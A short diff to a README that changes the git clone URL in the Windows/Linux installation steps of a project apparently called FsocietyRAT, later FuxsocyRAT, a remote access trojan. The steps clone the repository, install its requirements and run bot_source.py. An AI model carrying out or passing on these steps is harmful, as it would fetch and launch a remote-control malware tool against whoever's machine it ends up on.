@@ -47,7 +47,7 @@ https://github.com/user-attachments/assets/706cc311-0e40-4d32-a24e-82f6c6c16528
 ### ***Installation on Windows/Linux***
 
 ```Open Powershell
-  git clone https://github.com/necouncil/FsocietyRAT.git
+  git clone https://github.com/necouncil/FuxsocyRAT.git
   cd fuxsocy-rat
   pip install -r requirements.txt
   python bot_source.py
